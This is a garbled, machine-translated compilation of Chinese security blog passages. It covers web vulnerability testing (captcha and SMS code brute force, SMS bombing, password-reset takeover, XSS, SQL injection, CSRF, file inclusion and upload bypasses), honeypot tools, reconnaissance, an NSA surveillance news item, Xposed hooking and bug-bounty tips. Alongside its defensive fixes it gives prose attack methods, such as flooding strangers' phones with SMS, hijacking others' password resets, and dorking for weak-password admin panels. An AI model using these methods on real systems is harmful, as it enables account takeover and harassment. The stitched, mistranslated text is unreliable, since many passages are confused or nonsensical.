Some methods to prevent violent attacks are as follows: increase verification code, password encryption through encryption algorithm, the number of failures is more lock, password intensity increase graphics password code does not fail vulnerability description.

Some websites have graphic verification code in the login box to prevent violent crack attack, but the normal logic is to check the correctness of graphic verification code after entering the verification code, and then if true login operation, for false verification code input error, and use a verification code should be immediately invalid.

However, some website captcha may be controllable, entering some special characters may be able to cheat the server or verification code to use once and did not refresh the test method in time.

After entering the user name, password, and verification code, click the landing button to block the packet using burpsuite, and replay the data using the Repeater module or Intruder module.

Resend five observation page changes, whether you will prompt the verification code input error and other information examples.

If there is a graphic verification code in this login function, the data replay after entering the correct graphic verification code, and found that the graphic verification code did not fail in time.

The system pays attention to destroy the verification code in the session after verification and identification during development.

Description of bypassing the vulnerability: If some websites use the mobile phone SMS to log in, the SMS verification code can be bypassed or the verification code is too short and can be blasted.

Request to send a text message, fill in any verification code, and then submit other operation requests, empty or delete the verification code parameters, and test whether you can bypass the detection.

Try a privilege verification code like 000000,111111, etc.

Whether the same SMS verification code can be used many times.

The correct logic should be that after the SMS verification code is obtained, the server should verify the source and effectiveness of the SMS verification code, and should be invalid immediately after using it once.

However, what I encountered is that after using the verification code, users log in again after using the verification code and found that they still login successfully, that is, the SMS verification code was not deleted for risk analysis.

Modify / reset the password, transaction operation and other functions often require an SMS verification code. If the verification code can be bypassed, the attacker can exploit this vulnerability to conduct dangerous operations such as reset someone else's password or transfer.

If a privilege verification code exists, it is recommended to delete it.

The application service side should strictly check whether the verification code parameters are empty and whether the format is correct.

For each request, a new message verification code should be sent, and the old verification code should not be used.

The number of SMS verification code is too short or too long validity leads to violent crack test methods.

Click Send SMS verification code, enter any verification code, submit the request, intercept the request using burpsuite, and set the verification code parameter as the enumeration variable in the intruder module, which is the payload type for the violent crack of the verification code for numbers,.

The SMS verification code here can be violently cracked, because there is not set up SMS verification code error several times, so it can be violently broken risk analysis.

Change / reset password, transaction operation and other functions usually require SMS verification code. If the verification code can be violently cracked, the attacker can use the vulnerability to conduct dangerous operations such as reset someone else's password or transfer.

The SMS verification code is not less than 6 digits.

Effective for no more than 1 minute.

An account locking policy should be adopted when the number of verification code errors exceeds the upper limit.

A common attack, the attacker through the SMS verification code provided in the website page, through the sending packet acquisition, replay. If the server SMS platform does not do verification, the system will always send SMS messages, thus causing the vulnerability of SMS bombing.

manually find the website registration page, authentication page, whether there is a message sending page, if so, take the next step.

By using the burp or other package truncation tool, grab the packet that sends the verification code, and replay the attack, to check whether the phone has received more than 10 consecutive text messages in a short period of time. If you receive a large number of text messages, there is a vulnerability.

Use burpsuite to conduct data replay risk analysis: attackers fill in others's mobile phone number and submit the intruder function of software burpsuite, so as to achieve the purpose of sending a large number of spam messages to others' mobile phones in a short time.

Reasonable configuration of the background SMS server function, for the same mobile phone number, the sending times should not exceed 3-5 times, and the transmission time interval can be limited.

When the front desk code is written on the page, prohibit the transmission for the same mobile phone number is more than N times, or the verification code function is added to the page, and the sending time interval is limited.

Malicious locking problem vulnerability description: through continuous input wrong password can malicious lock any account password test method: for the test account, constantly enter the wrong password, until the lock it example: risk analysis: if the system authentication function has no prevention automatic processing module, the attacker can write a script batch lock system account.

2. The authentication function should not continue to prevent the automatic operation, such as adding a graphic verification code.

Password explicit transmission vulnerability description: The transmission is not encrypted during the authentication process.

By grabbing the request of the website login page, the tool is available to burp, wireshark, filder and so on.

Enter the user name password.

Use burpsuite to intercept risk analysis: an attacker sniffs explicit authentication credentials, such as user name password, SESSIONID and other sensitive information, by sniffing network traffic in the LAN network.

It is suggested that according to the secret level requirements of the website, encryption requires encryption, such as using HTTPS, but encryption to increase the cost, which may affect the user experience.

If you do not use HTTPS,, you can use Javascript as password encryption at the front end of the website, encryption before transmission.

Reflective cross-station script attack vulnerability description: The English full name of the cross-station script attack is Cross Site Script, to distinguish from the style sheet, abbreviated as XSS.

It happens because the site outputs the user input into the page, in which process malicious code may be executed by the browser.

Cross-station scripting attack which refers to a malicious attacker inserting malicious h t m l code into a Web page and when the user views the page the html code embedded in the Web is executed for the special purpose of the malicious user.

There are three known cross-station script attack vulnerabilities: 1) storage; 2) reflective; 3) DOM-based.

GET mode across the station script: Add the following statement after the parameters entered, take the first one as an example.

The test statements of specific cross-station scripts vary depending on the reality, can be self-constructed, as well as trigger events, and only some of the most common construction statements are listed here.

Reflection XSS injection in the user name click login, successfully pop up content risk analysis.

An attacker can use the vulnerability to construct phishing links and trick the victim into accessing and filling in the user name and password, thereby stealing the user's authentication credentials fix.

Use a standard input validation mechanism to verify the length, type, syntax of all input data, and business rules before any data is accepted as if it can be displayed or stored.

Before data output, ensuring that the user submitted data is entity encoded correctly, it is recommended that all characters are encoded and not limited to a subset.

Don't allow an attacker to choose the encoding method for your users.

Note the limitations of blacklist validation: Just find or replace characters (such as "<"  ">" or "keywords like" script") can easily bypass the validation mechanism by XSS variant attacks.

Before verifying the input, it must be decoded and normalized to meet the current internal representation of the application.

Make sure that the application does not decode the same input twice.

Use a parameterized query to avoid stitching the unfiltered input directly into the SQL query statement.

The permissions of the users in Web applications are strictly distinguished from the system administrator users of the database (such as unable to perform drop, etc.) and set that users in the Web application are not allowed to operate other databases.

Users who set up in the Web application to connect to the database do not allow write permission to the Web directory.

Use the Web to apply a firewall.

By combining sql statements, the attack test method to change the meaning of the original statement: 1. Check all links through the web vulnerability scanning tool, or manually determine whether there is an injection point. Once a vulnerability is confirmed, you can use the automation tool sqlmap to try to inject.

The main reason for SQL injection is that the program does not strictly filter the data input by the user, resulting in illegal data intrusion into the system.

Special characters entered by the user are strictly filtered, such as ', ", <,>, /, *,;, +, -, &, |, (,), and and, or, select, union.

Use a parameterized query to avoid stitching the unfiltered input directly into the SQL query statement.

The permissions used in the Web application to connect to the database are strictly distinguished from the system administrator users of the database, and set the users used in the Web application to connect to the database are not allowed to operate other databases.

Users who set up in the Web application to connect to the database do not allow write permission to the Web directory.

Use the Web to apply a firewall.

Any user password modification / reset vulnerability description: The password of any account can be modified / reset by tampering with the user name or ID, violent crack verification code, etc.

The password modification step is generally to check whether the user's original password is correct, and then let the user enter a new password.

Password reset mechanism bypass the attack: 1. Get the reset password link through normal means, and guess the structure and content of the link.

Construct a link to reset someone's password when you know someone's mailbox.

Reset other people's password by knowing their phone number by exhausthe phone verification code.

The password reset vulnerability I encountered is that I will automatically send a phone message to the phone when forgetting the password, and what I do is intercept it, then modify the phone number, successfully accept the phone message, and then reset the user password.

Another is that after the mobile phone SMS verification, intercept the packet when you reset the password, and modify other people's account password by changing ways such as username, userid.

Password modification function is often implemented step by step, and the attacker bypasses some test steps to modify the user password with an unknown original password.

The reset password process is generally to first verify the registered mailbox or mobile phone number, obtain the link or verification code of the reset password, and then access the reset password link or enter the verification code, and finally enter the new password.

Password reset mechanismSurventing an attack is to directly reset someone else's password by constructing a reset password link or exhaustive mobile phone verification code without an unknown reset password link or mobile phone verification code.

Timely verify the requested user identity and the current logged-in user identity, judge whether you have the right to modify the user's password, and also determine whether the original password is correct.

With the verification of the original password, the number of errors in entering the original password is limited to prevent the attacker from violently breaking the original password.

Key information in the reset password link should be randomized, unpredictable, and prohibit the return of key information to the client.

Directory browsing vulnerability is due to the configuration defects of the website and directory browsing vulnerability, which will lead to many privacy files and directories leaked, such as database backup files, configuration files, etc., attackers can use the information to more easily access the website permission, leading to the website to be hacked.

Use web vulnerability scanner can scan web application for detection or by search, website title containing "index of" keywords website for access.

The common middleware for this vulnerability are apache and IIS, and the related methods are listed below.

Turn off directory browsing in IIS: In the IIS website properties, check the Directory Browse option and restart the IIS.

Close the directory browsing function in Apache: Open the Apache profile httpd.For conf, find "Options Indexes FollowSymLinks", modified to "Options-Indexes" minus denote cancel, save exit, restart Apache.

Directory browsing is not turned on by default in Nginx, and if you find that it is currently on, you can edit nginx.The conf file, delete the following two lines: autoindex on;autoindex_exact_size on.

Sensitive data includes, but is not limited to, passwords, keys, certificates, session identifications, License, privacy data, authorization credentials, personal data, etc., and may contain sensitive data in program files, configuration files, log files, backup files, and databases.

Detection forms are varied, and the tool crawler scans the path to the sensitive files, thus finding the sensitive data.

Manual manually to find sensitive information based on the web container or web page source code.

Here I brought you the recent fire sharp information leak, in the source code leaked the user name password information leaked the user name and MD5 encryption password, of course, there are some strange work, will directly pop up to test the user name password, and even the user name password automatic filling and so on I think only these deserve to become an information leak.

The rest of the leaked encryption, middleware version information is too lazy to measure the risk analysis.

The attacker can obtain the website sensitive files, collect the website sensitive information, and thus targeted utilization.

Vulnerability in the development framework, such as the Struts2 framework vulnerability, shiro, etc.

After understanding the structural framework adopted by the website, remove the pseudo-static page, grab the package or read the page source code mode, and find that the website system url is.do and.After the action end type, add the corresponding remote command execution code for judgment.

Information transmission lacks security guarantee SSO certification communication process most use sensitive information in the form of sensitive information, which is easily stolen, resulting in important information leakage.

In addition, most schemes do not sign the key information during the communication process, and are vulnerable to camouflage attack.

Security Defects of Web Services Since single sign-on is basically implemented based on Web services, there are also inevitable security defects of Web services, such as cross-station script attacks, overreach attacks, etc.

Because you only need to log in once, all authorized application systems have access, which may lead to some important information leakage.

Recommend defense from the following aspects: 1. Use the HTTPS protocol transmission without affecting the business.

3. Filter user identity in SSO authentication for incoming parameters, escape or mask special symbols.

They have ample time, skilled skill and rich resources, and can win with one success in countless attempts.

But the security team's defense needs to guarantee a 100 percent success rate.

That is what we often say is "offensive and defensive and unequal."

What does the defense do to overthrow the attacker who had "taken the lead" before the campaign began?In the current security market, the real sense of proactive security technology is cheating defense.

The biggest characteristic of deception technology is the cognitive cost, economic cost and time cost in offensive and defense activities to the attacker.

In 1989, the core idea of Internet deception was first proposed in May.

Despite their long concept, research and application of deception techniques have only emerged in recent years.

The significance of deception technology for the detection of intranet penetration activities, discovery authority improvement, and the establishment of threat information database is almost incomparable.

This article will recommend several free open source deception tools as introductory lessons in deception techniques.

But open source tools all have common weaknesses. The —— use experience and practical results cannot be guaranteed.

Cowrie is a moderately interactive SSH and Telnet honeypot used to record violent attacks and shell interactions executed by an attacker.

It is capable of simulating interactive SSH servers and has a customizable command response mechanism.

Another similar tool is the HonSHH (https: / / github.com/tnich/honssh), deployed between a real SSH server and an attacker, implementing a "middleman (MiTM)" connection and recording all SSH communications.

It is even able to detect shellcode by simulate malware payload via LibEmu or analyze attack activity.

Other IoT decoys can be created by simulating embedded telnet / FTP servers, such as using the software BusyBox.

It also comes with a W e b server that simulates the SCADA HMI.

The GasPot is commonly used to monitor the oil and gas industries.

MongoDB-HoneyProxy simulates an insecure MongoDB database.

Hackers often scan the Internet for databases with security vulnerabilities and make them public.

The MongoDB database is therefore a class of decoys with higher hit rates.

ElasticHoney is a simple ElasticSearch honey pot that mainly uses RCE remote code execution vulnerabilities to discover attackers.

Honeytoken is a bait with some information content that is never normally used, and once the honeytoken are found to be accessed, it indicates that the information content may be attacked.

In DCEPT, honeytoken is primarily false credentials whose login attempts indicate malicious activity in the network.

Canarytokens developed by the Thinkst Applied Research Institute places different types of decoy data in the user system, waiting for malicious activity and behavior.

There is currently a commercial version of the ThinkstCanarytokens.

Thug is a "disguised client" that simulates web browser behavior analyzing client attacks, capable of analyzing malicious links to detect whether they contains JavaScript, ActiveX or Flash components.

payload samples were also able to download downloaded and integrated with VirusTotal for analysis.

Cuckoo Sandbox is a sandbox tool that analyzes malware, where we can perform samples of suspected malicious software and binaries, Microsoft Office documents and emails in Cuckoo VM, and also receive a complete report of what code has been executed, what files / registry were changed, and what network callback s were observed.

HoneyDrive is the superior Linux honey pot distribution with over 10 pre-installed and pre-configured honeypot packages like Kippo SSH, Dionaea and Amun malware, Honeyd low interactive, Glastopf web and Wordpot, Conpot SCADA / ICS, Thug and PhoneyC and more.

In addition, it has many practical pre-configuration scripts and programs, such as Kippo-Graph, Honeyd-Viz, DionaeaFR, ELK stack, etc., to analyze, process, and visualize the data.

MHN is a centralized server for honey tank management and data collection, which enables the rapid deployment of sensors and the rapid data collection. The Web interface is simple and clear.

Its honeypot deployment scripts include several common honeypot techniques: Snort, Cowrie, Dionaea and glastopf, etc.

Deploying these tools is not difficult to professional security personnel.

After the deployment, we can test from the perspective of the attack side, optimize the source code, and reduce the difficulty of fingerprint identification.

If you do this step, also do not forget to submit patches to the author, to promote the spirit of open source.

Or in that sentence, open source projects can only play an auxiliary role to help you understand the role of honey cans or cheating products, and to achieve real defense and detection results should rely on business tools developed by professional manufacturers.

He will provide some of the IPV4,IPV6, domain names, so what can we start with IP and IP first?

We already know that an ip belongs to the education network segment, so how do we know the other ip specifically?

Passive information gathering Passive information collection is using some online mass crawling websites.

Because these syntax online quite much, don't take specific websites to show.

As above, can be mixed to achieve more perfect results.

Information collection can be divided into two categories: passive information collection and active information collection.

The following is presented in both directions separately.

Passive information collectThe so-called passive information collection means that information is collected by not interacting directly and testing the target.

Simply put is that the test target does not know that you are gathering information.

It's like you like a girl, do not directly ask her for contact information, but to her classmates / friends plate side click for contact information.

A useful tool for network sniffing is that all the ports of the hub,hub are in the same conflict domain, different from one per port of the switch, so a machine attached to the same hub can receive packets from all devices.

Sniffing of wireless network packets requires specific wireless network card support, such as Intel 3945ABG.

OSINT is information that Open Source Intelligence, can be simply understood as open source on the Internet.

We often hear human flesh searches, and part of it is using OSINT to search for information about targets.

Like social accounts, id, etc.

Test objectives can theoretically know that you are gathering information.

Scapy is a powerful interactive package processing tool, package generators, network scanners, network discovery tools, and a package sniffing tool.

It provides multiple categories of interactive generated packets or packet sets-fits, packet manipulation, packet sending, packet sniffing, response and feedback matching and more.

Voucher scanning refers to the login voucher that provides the root permission of the scanner system, such as providing the ssh/telnet account password, and the scanner can enter inside the scanned system through the voucher.

If conditions are recommended, because such scans will be relatively accurate and the coverage will be comprehensive.

Discovery scan is similar to nmap, constantly in the probe, and then matching the database, the goal is to discover the host, port, service, version, web path, etc.

Typical examples of full scanning such as Nessus,Nessus can configure policies, such as running all the plugins, but in fact many plugins do not apply and can be cropped out to speed up the scan.

Passive scanning is secret scanning to mirror the normal user-access process port to the scanner. The scanner establishes a network topology according to the information and determines whether there is a security vulnerability.

The purpose of the secret scans is not to want the target to find the scan traces.

Compatibility scans such as GDPR scanner, warranty 2.0 scanner, HIPAA scanner, etc., for specific rules to test whether the target equipment meets the standards, but many times still need to participate in the evaluation.

The scanning protocol confirms that if the device currently supports udp and tcp, both tcp,udp should be configured when configuring the scanning options, otherwise it may cause missed sweeps.

Network topology tries not to scan targets across multiple networks, which may cause some additional uncertain effects.

It is best that the scanner and the target device are configured in the same network, like all deployed in the DMZ.

Bandwidth limitation When scanning, consider the bandwidth limitation, on the one hand, reduce the impact on other devices in the network, on the other hand is to avoid affecting the scan progress and results because the bandwidth reaches the upper limit.

Other resource restrictions exclude bandwidth reasons, there may be other factors that may cause scan bottlenecks, such as multithreaded target device abnormalities, etc., this factor should also be considered when scanning configuration.

fragile systems such as printers, IoT devices, to selectively scan, or even directly exempt scanning.

But in fact, such devices may also increase the risk, especially as IoT devices have been often exploited in recent years.

So according to the comprehensive scanning strategy configuration according to the actual situation.

I prefer this process to be called a fragile point evaluation.

According to the PTES process, information collection is followed by threat modeling, followed by vulnerability point assessment.

We also score it as low-risk or information.

So although it doesn't seem that a fragile point is low-risk, if you use some vulnerabilities in series, it can cause great damage.

With a simple abstract diagram to illustrate my understanding of the fragile point evaluation, I abstracted the test target / system as a circle, outside the circle is the user interacting with the system, black circles and inner white blocks represent the processing process and assets of the system.

The task of vulnerability point evaluation is to find out the vulnerability point one by one, point A is a clear vulnerability point, but some people only measure the longitudinal point, so they give low risk, while others measure the horizontal point and give high risk.

Point B seems to be a fragile point, but in fact, this point has been reinforced, should be no problem, report the fragile point is also possible, it is best to report a information.

Point C is not so clear, from God's point of view, here is really a fragile point.

Point D runs directly through the internal system, but is less easy to detect because the exposure is small.

Talking about automation, for Party A, it relies entirely on manual penetration. Whether it employs hired as a red team for penetration test or paying Party B to test, the cost is quite high, and the coverage is very limited.

My point of view is that achieving the top of safety is to cultivate a safety culture, with invisible and no move. SDLC is like law, which is to promote and restrain through mechanism, and safety culture is like morality, which is driven and constrained by inner consciousness.

In these two days, another virus invasion was handled. On the basis of the previous one, this emergency has made some automatic scripts, and the emergency response efficiency has been improved to a certain extent, so make another note.

Emergency Operations Notes View my last Linux Emergency Response Notes, I found that listing so many commands, many times dazzling and inconvenient to operate, it is better to write a shell script to automate the information collection.

Automated Information Collection My automated mobile phone information script is as follows. The original intention is to automate information collection, and do not need me to connect to customer equipment, improve operation or communication efficiency.

Analysis of information collection results View all the file contents under the automatically collected information GatherInfo, comb and check the emergency response checklist according to the following Checklist table items, and no abnormality was found in the network.

In the screening timing task crontab, found three lines of abnormal timing task I get the malicious script local, this is a shell script, next analysis to see what this script malicious script analysis malicious script script a total of 439 lines of code, the first 300 lines are to delete files and kill the process, I simply summarize a few code next is to download the malicious binary and ssh horizontal propagation above three code is through ssh certificate login horizontal infection transmission.

The above code is a download malicious binary that should be the mining virus ontology.

In any case, or try to ensure the system security, reduce the system invasion attack surface, which can greatly protect the system from intrusion.

Protection advice In general, automated intrusion is generally using very simple vulnerabilities, such as if the password, using vulnerability components, unauthorized access, etc., another way infected with the virus is s s h certificate authentication.

There are three ways for ssh horizontal propagation, which seems to be very popular.

So for manufacturers, or to have the appropriate control of the ssh certificate log-in.

Wireshark uses WinPCAP as an interface to exchange data messages directly with the network card.

Metasploit FrameworkMetasploit Framework is a computer security program designed to provide security vulnerability information that can assist security engineers in penetration testing and intrusion detection system signature development.

HydraHydra is a parallelized network login crack program built into various operating systems.

Hydra guessed the correct username and password by using violent attacks.

Aircrack-ng can be used to monitor, collect information about WiFi for the SSID (Service Set identifier) IP and MAC addresses and crack passwords for WiFi.

Can help to detect and repair vulnerabilities, malware, configuration errors, and patches on various operating systems, applications, and even devices.

However, it is no longer a free tool, and the free features are limited.

Wafw00f is a firewall detection tool, and Wafw00f uses a set of HTTP requests and methods to query Web servers, analyze responses from them and detect Firewall 8. Burp SuiteBurp Suite is a graphical tool for testing network application security, an excellent network security analysis tool.

The HTTP agent runs as a Web proxy server and lies between the browser and the target Web server.

This allows for the interception, inspection, and modification of the original flow passed in both directions.

A Web application security scanner used to perform an automatic vulnerability scan of a Web application.

The Intruder tool can test and detect vulnerabilities in SQL injection, cross-station scripts, parameter tampering, and brute force vulnerability.

Spider is a tool to automatically grabs a Web application.

Repeater is a simple tool that can be used to test applications manually.

It can be used to modify the requests to the server, resend them and observe the results.

Decoder is a tool to convert encoded data into its canonical form, or convert raw data into various encoding and hash forms.

It is able to intelligent identify multiple encoding formats using heuristic techniques.

Comparer is a tool for perform comparisons between any two data items.

Extender allows security testers to load the Burp extension, extending Burp functionality using the security testers's own or third-party code.

Sequencer is a tool for analyzing the nature of sample stochasticity of data items.

It can be used to test an application s session token or other important data items such as anti-CSRF token password reset token etc.

Maltego is an open-source intelligence and graphical link analysis tool to collect and connect information used for survey tasks.

The Maltego is loved by security personnel for being simple, intelligent and powerful.

The W3AF is an open-source security scanner for the Web application.

The project provides a vulnerability scanner and vulnerability utilization tool for Web applications.

It provides information about security vulnerabilities so that using W3AF in penetration test projects uses Arconym, of the Web application to attack and audit framework to find flaws in the site.

Wpscan, a vulnerability scanning tool brought in by Kali Linux, written in Ruby to scan multiple security vulnerabilities in WordPress sites, can scan WordPress vulnerabilities for all Web developers and find and solve problems before they develop.

WordPress is a free, open-source content management system.

sqlmap is an open source penetration testing tool that can be used for automated detection to automates the process of exploiting SQL injection vulnerabilities to help you take over the database server.

The breadth of information collection determines the breadth of the attack, and the breadth of knowledge determines the depth of the attack.

Information collection Information collection can be viewed from multiple fields: companies, subsidiaries, domain name, subdomain name, IPV4,IPV6, applet, APP,PC software and so on.

Passive information gathering Passive information collection is using some online mass crawling websites.

Because these syntax online quite much, don't take specific websites to show.

The Danish Defense Intelligence reportedly allowed NSA access to a major Danish Internet and telecommunications hub and allowed U. S. intelligence agencies to monitor communications from European politicians.

The BBC said the NSA had gathered intelligence from German, French, Swedish and Norwegian officials.

The DR called the operation Operation Dunhammer, which was revealed through joint investigations by some European news giants.
The NSA uses the monitoring platform XKeyscore, to monitor communications through Dragor near Copenhagen, choosing the hub because it was a connecting point for several key submarine cables connecting Denmark and Scandinavia.

XKeyscore has an extensive collection of online data, including email, social media as well as browsing history.

It is not the first time, in 2013, Snowden, famous in the US, said a tool called DNI Presenter allows the NSA to read stored email content, and it also enables intelligence analysts to track user activity on Facebook through a system known as XKeyscore.

The White House responded at the time that it was not listening to Merkel's phone and would not do so in the future.

But the White House did not say whether the NSA had listened to Merkel's mobile phones in the past.

In 2015, Kim atu, the world's largest producer of mobile SIM cards, confirmed that U. S. and British intelligence agencies had likely invaded the company's network to listen to global mobile phone communications, targeting dignitaries such as Merkel.

Swedish Defense Minister Hultquist said to the Swedish media that he "requested full information about the incident" and that Norwegian Defense Minister Buck Jensen told the media that he "will be taking these allegations seriously."

A spokesman for the German chancellery said they had learned of the situation after being asked about it and had refused to give further comment on the matter.

Snowden, Snowden, accused Biden of being a key figure in the operation, who was serving as vice president of the US when it took on.

In addition, he said on Twitter: " Biden is ready to answer this question for his recent trip to Europe, and of course, he has been deeply involved in the scandal.

Not only in Denmark, but their senior partners should also explicitly demand full public information.

On the Internet, tutorials about Xposed modules are a lot.

But many tools and methods have changed over time and therefore, online tutorials often have some time limits, such as the keyword provide has been abandoned and still used, and some say putting a jar package into a lib folder rather than a libs folder... various mistakes or outdated tutorials are very misleading to beginners.

We can let us modify the framework service of the program operation through the modules written without modifying the APK source code, and realize functions similar to automatically grabbing red envelopes, WeChat message automatic reply and other functions.

In fact, essentially, the Xposed module is also a Android program.

Let the xposed framework on the phone know that the program we installed is a xposed module.

The module wants to contain the j a r package with the xposed API to implement the next hook operation.

This module has a way to hook on the target program.

We can set the project view mode to Project mode for easy viewing.

Note that the Xposed framework has recognized the program that we wrote about.

Although the framework already feels like he is a Xposed module, we know that nothing can do.

Step out of step 2 and fix the XposedBridgeApi-xx.The jar is with build.gradle We know that the main functions of Xposed modules are various functions used for Hook other programs.

Take the third step to implement the specific code of the hook operation.

Similarly, select the second payload and click on the top right start attack as above to start enumerating the crack.

Through the above crack, we found that the length of the length is different, the different is to crack the successful account and password.

Start operation: arbitrarily enter the account number and password in the module, and grab the package in burp to find an extra token parameter.

Send the caught packet to intrude, select attack mode to pitchfock, and set dollar parameters to crack, set attack thread thread to 1 in the option tab because Recursive_Grep mode does not support multithreaded attacks, then select Grep-Extract, to extract useful information in the response message, click Add, set the figure below, and finally set Redirections to Always.

Finally, the attack crack the final login command injection, some functions do not filter or lax filtering parameters, can execute the system or apply an injection attack means of instructions.

A PHP command injection attack vulnerability is one of the common script vulnerabilities in PHP applications.

The H i g h-level code further improves the blacklist compared to the Medium-level code, but we can still bypass it due to the limitations of the blacklist mechanism.

CSRF refers to the illegal operation by using the victim's uninvalid authentication information to click on a malicious link or access a page containing the attack code to send a request to the server without the victim's knowledge to the victim.

The name of the variables is the key of the array.

As can be seen from the source code, this is just the two passwords entered by the user to see whether it is equal.

Inequivalence suggests a password mismatch.

Equequal, see if there is a global variable setting the database connection and whether it is an object.

For the same object, encrypt it with md5 and update the database.

After knowing this, we tried it secretly inconsistent twice for the first time.

Here, because the requested token is verified, it is more secure than the last two levels.

Since the request is a get request, the token validation will be placed in the request URL and we just enter the password verification and see that token. is added at the end of the requested URL

To exploit to bypass the High-level anti-CSRF mechanism, the key is to get the token, to use the victim's cookie, to modify the password page, to get the key token.

Try to construct an attack page, place it on the attacker's server, and lure the victim to access it, thus completing the CSRF attack.

Since cross-domains are not possible, it is possible to complete the attack with injecting the attack code into the target server 192.168.109.136.

You can use the High-level XSS vulnerability to help get the Anti-CSRF tokenXSS injection with a length limit, you can not inject the complete attack script, so only get the Anti-CSRF token.

Developers write the same function to a separate file, and they need to call the file directly with a function, without having to write it again. The process of this file call calls the file contains.

File contains vulnerability: To make the code more flexible, developers set the included file as a variable for dynamic calls, causing the client to maliciously call a malicious file, causing the file containing vulnerability.

require: could not find the included file, reported an error, and stopped running the script.

include: could not find the included file, only reported errors, but continues to run the script.

require_once: is similar to require and the difference is that when repeating the same file the program calls only once.

include_once: is similar to include and the difference is that when repeating the same file the program calls only once.

Directory traversal and file contains the difference directory traversal is you can read other than the web directory, the root is the lax path access settings, for this system.

File inclusion is using functions to include files other than the web directory, divided into local and remote inclusion.

The Warning in the first line just could not find the x i x i that we specified.The php file that is doesn t contain the file we specified so Warning.

The second line gives the warning because the specified file was not found before, so when it is included.

But filtering with the str_replace function is unsafe because it can be bypassed using double-write.

Thus, we can use the file protocol to bypass it.

File upload vulnerability is usually due to the strict filtering and inspection of the uploaded file, so that the attacker can access the webshell permission of the server by uploading Trojan, so the harm of file upload vulnerability is often devastating, Apache, Tomcat, Nginx and so on have exposed the file upload vulnerability.

As can be seen, the server did not do any inspection and filtering on the type and content of the uploaded file, and there are obvious file upload loopholes. After the upload path is generated, the server will check whether the upload is successfully and return the corresponding prompt information.

There are restrictions on the utilization of file upload vulnerabilities. The first of all, it is to be able to successfully upload Trojan files, then the upload file must be able to be executed, and finally, the path of the upload file must be known.

All three conditions are met here.

The function returns the location where the string find last appears in another string string and the false, optional parameter start specifies where the search starts if the string is not found.

The getimagesize function returns the length and width of the picture by reading the file header, and without the relevant picture file header, the function will report an error.

You can see that the High level code reads the last in the filfile name "."After the string, expected to limit the file type by the file name, so requires that the upload file name form must be" *.jpg”、”*.jpeg”、”*.png" among.

At the same time, the getimagesize function restricts the file header of the upload file to be the image type.

At the beginning of the goby sweep, I was also like the vegetable brother, I did not feel anything, until a master reminded me: is this not a Sprint boot framework, so many holes?That also led to my later percent hole.

Information collection Information collection can be viewed from multiple fields: companies, subsidiaries, domain name, subdomain name, IPV4,IPV6, applet, APP,PC software and so on.

With the network section, we can carry out the next step of active information collection in the active information collection, we can use some powerful asset mapping tools, goby is still very good, it will have some web services, for you to pick up leakage, don't worry about no banner, sometimes goby also do not know it!But often these people without banner will have problems.

Passive information gathering Passive information collection is using some online mass crawling websites.

Because these grammar online quite much, individual do not take specific websites to do display.
Google hack syntax Baidu syntax Fofa syntax shodan syntax Zhong Kui eye micro step online Google let's look at Google,Google syntax you may be familiar with the most basic edu website suffix.

Multiple combinations can often emit different charm Baidu grammar and google grammar is not too big gap between grammar.

Because a school's icon_hash is often a few fixed, so when we search for icon_hash, we will also have different results.

As above, can be mixed to achieve more perfect effect (dish brother first article, big guys do not spray).

First we should know that Spring boot 2 and Spring Boot 1 are different payload and also different routing addresses.

I think anything exists, he is reasonable, of course including charity src.

I think it means great to accumulate more practical experience.

Of course, sometimes there will be artificial to confirm loopholes in advance because the general submitted vulnerabilities will be reviewed within a day or two, if a day or two later found their loopholes have not been reviewed, that is their loopholes pressed down, auditors haven't audit to your loopholes, only submit more, put others loopholes pressure, can become the key to win.

The main competition of charity SRC is nothing more than hand speed, hand speed determines everything.

Google grammar keywords: region / industry inurl: "register" region / industry inurl:"regp.asp"regsave.asp、Reg.asp、userreg.Any registration such as asp, reg1.asp is a low-risk vulnerability, but there are also two points.

Here I personally recommend the white zer security team vulnerability library.

Baidu syntax to find weak password background site syntax can be like finding sql injection site a replacement area and industry background keywords can also be replaced at will, here you play, start imagination, thinking is the key to the teacher once said, to test the weak password site, you can try account: admin/test/cs/ceshi/test01, etc.

Sometimes I think this site to filter my input data, but throw into sqlmap occasionally have the possibility of measurement note: test sql injection search box can easily test xss, roughly see the website has what functions, can measure also just as well start to say, manual test to possible injection site should carry on the next step?

If I test that the site has injection, then I will save it to txt, continue down, and then run sqlmap in batch. When I am free, I give it to him the answer: How can sqlmap run the injection site in batch?

So I hope the students can fill it in carefully.

A waste of time, on the pursuit of high efficiency, speed to fast posture to be handsome.

So much so that the effect of the vulnerability, I can only say, the actual.
Although this puppet collector is 1.0, I inexplicably think 1.0 than 6.0 is good to collect url and then determine whether there is an injection. I think this tool sometimes has a misjudgment.

After all, is tools, tools are using limitations.

But keep changing the grammar, you can still dig a hole.

Before commercial HIDS products measured ivy cloud, open source HIDS measured osses, osquery, yulong-hids, etc., these products are based on rules, database, behavior of risk identification and prediction, the overall feeling is in the passive defense, known risk can be identified, the unknown risk, technical violations, variant virus, and how to defend.

Especially in the case of limited manpower of the security department, no one can sort out and summarize the rules, so even if the HIDS platform is well established, it will not play a role.

Host security problems facing attack methods, defense point fixed relative to the attacker, business model or online services, technical model has basically fixed, communication is either HTTP, or RPC, few custom network protocol, server operating system is basically Linux and Windows, middleware to Nginx, mysql, redis, and the attacker attack script is not fixed, can be various confusion encryption, let mention all kinds of bypass, kill technology, github casually search can find.

Security defenders have been trying to guess the intention and techniques of the attacker, so as to establish defense rules and identification methods, which is more effective against ordinary attackers or reaching the party, but the real attacker attack method is certainly changeable, security defenders have been led by the nose by the attacker.

Too dependent on behavior recognition now security products do not mention machine learning, behavior analysis are embarrassed to take out, but behavior recognition brings problems and rules, are more solidified, applicable to specific scenarios, also, false report and false report is more serious, but the research and development of machine learning model investment resources is more, with little effect.

In the process of construction, because it is mainly recognized around the server, it is basically 0 involved in the process of HIDS implementation, rule making and risk identification business.

In my opinion, host security is good, web security, security methods are basically those kinds, but the perspective should be changed, before is the attacker's perspective to develop security defense, now it is converted to the business model as the perspective, attack perspective assistance.

First of all, we should define the model of business operation first. The baseline is not only at the operation and maintenance level, but also needs to go deep into the business level.

Because online business, once online, the basic operation mode has been fixed, what is the process called, what is the path, output, input, etc., so these information, can be sorted into business operation security baseline, based on the baseline, business operation, server operation monitoring, once occurs out of the baseline behavior, security immediately borrow processing.

Different businesses build different defense strategies. To establish different defense strategies, such as online business is impossible to write into crontab, and the test environment needs to be written frequently.

For databases, big data and other data servers, they mainly monitor the changes of non-data-related documents to prevent ransomware virus.

